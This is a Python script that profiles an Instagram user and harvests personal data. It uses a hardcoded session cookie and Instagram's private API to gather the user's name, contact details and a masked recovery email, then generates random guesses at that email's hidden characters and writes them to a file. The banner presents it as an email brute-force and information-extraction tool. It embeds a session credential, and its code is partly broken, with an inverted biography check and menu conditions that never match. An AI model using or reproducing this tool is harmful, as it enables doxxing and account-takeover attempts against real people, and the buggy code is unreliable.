import argparse,json
from requests import get
from quidam import instagram
import random
import sys
import os
import time

def recoveryEmail(username):
    return(instagram(username))

def getUserId(username,sessionsId):
    cookies = {'sessionid': sessionsId}
    headers = {'User-Agent': 'Instagram 64.0.0.14.96',}
    r = get('https://www.instagram.com/{}/?__a=1'.format(username),headers=headers, cookies=cookies)
    info = json.loads(r.text)
    id = info["logging_page_id"].strip("profilePage_")
    return(id)

def getInfo(username,sessionId):
    userId = getUserId(username,sessionId)
    cookies = {'sessionid': sessionId}
    headers = {'User-Agent': 'Instagram 64.0.0.14.96',}
    response = get('https://i.instagram.com/api/v1/users/'+userId+'/info/', headers=headers, cookies=cookies)
    info = json.loads(response.text)
    infoUser = info["user"]
    return(infoUser)

def getFullName(username,sessionId):
    infos = getInfo(username,sessionId)
    return(infos["full_name"])

def getProfilePicture(username,sessionId):
    infos = getInfo(username,sessionId)
    return(infos["profile_pic_url"])

def getBiographie(username,sessionId):
    infos = getInfo(username,sessionId)
    return(infos["biography"])

def extractEmail(username,sessionId):
    userId = getUserId(username,sessionId)
    dict = getInfo(userId,sessionId)
    try:
        return(dict["public_email"])
    except:
        return("NULL")

def extractPhone(username,sessionId):
    userId = getUserId(username,sessionId)
    dict = getInfo(userId,sessionId)
    try:
        return(dict["public_phone_country_code"]+dict["public_phone_number"])
    except:
        return("NULL")

def getAllInfos(username,sessionId):
    userId=getUserId(username,sessionId)
    recoveryemail=recoveryEmail(username)
    cookies = {'sessionid': sessionId}
    headers = {'User-Agent': 'Instagram 64.0.0.14.96',}
    response = get('https://i.instagram.com/api/v1/users/'+userId+'/info/', headers=headers, cookies=cookies)
    info = json.loads(response.text)
    infos = info["user"]
    try:
        publicEmail=infos["public_email"]
    except:
        publicEmail=""
    try:
        publicPhone=str(infos["public_phone_country_code"]+infos["public_phone_number"])
    except:
        publicPhone=""
    return({"username":username,"userID":userId,"FullName":infos["full_name"],"biography":str(infos["biography"]),"publicEmail":publicEmail,"public_phone_number":publicPhone,"recoveryEmail":recoveryemail,"ProfilePicture":infos["profile_pic_url"]})


fa = print('''
-------------------------------
.:: Brute force mail Instagram and information extraction ::.

    by FaLah - 0xfff0800       
    Snapchat - flaah999     
-------------------------------
Fetching the username info
Brute force on the name of the email

''')

 
if fa == '1':
  parser = argparse.ArgumentParser()


username = input('username -> ')
sessionsId = ('37466401585%3AdZdcdZxVhMrGOI%3A16') 
infos = getAllInfos(username,sessionsId)

print("Informations about : "+infos["username"])
print("Full Name : "+infos["FullName"]+" userID : "+infos["userID"])

info = getInfo(username,sessionsId)
print("Verified : "+str(info['is_verified'])+" Is buisness Acount : "+str(info["is_business"]))
print("Is private Account : "+str(info["is_private"]))
print("Follower : "+str(info["follower_count"]) + " Following : "+str(info["following_count"]))
print("Number of posts : "+str(info["media_count"]))
print("Number of tag in posts : "+str(info["following_tag_count"]))
print("External url : "+info["external_url"])
print("IGTV posts : "+str(info["total_igtv_videos"]))
if len(infos["biography"]) >1:
    infos["biography"]="Not found"

print("Biography : "+infos["biography"])

if len(infos["publicEmail"])==0:
    infos["publicEmail"]="Not found"

print("Public Email : "+infos["publicEmail"])

if infos["recoveryEmail"]=="NULL":
    infos["recoveryEmail"]=="Not found"

print("Recovery Email : "+infos["recoveryEmail"])

if len(infos["public_phone_number"])<1:
    infos["public_phone_number"]="Not found"

print("Public Phone number : "+infos["public_phone_number"])
print("Profile Picture : "+infos["ProfilePicture"])
########
if fa == '2':
  print('الان تخمين علي الاميل المشفر ')
a = input('ماهو اول حرف في الاميل المشفر ؟')
k = input('ماهو اخر حوف في الاميل المشفر ؟')
  
uesr = ''+a+''
chars2 = 'qwertyuiopasdfghjklzxcvbnm1234567890_-.' 

d = input('ماهو نطاق الاميل الي ظاهر في نهاية الاميل المشفر ؟')

o = '@'
email = ''+d+''
print('==================================')
amount = input('كم عدد الاميلات تريد ؟')
amount = int(amount)
length2 = input('كم عدد نجوم الاميل ؟')
length2 = int(length2)

print('==================================')
print('تخمين علي اسم الاميل المشفر ')
print('')
print('')
for password in range(amount):
    password = ''
    
    
    for item in range(length2):
         password = ''
    for item in range(length2):
        password += random.choice(chars2)



    print (uesr+password+k+o+email)
    with open('email.txt', 'a') as x:
     x.write(uesr + password + k + o + email + '\n')
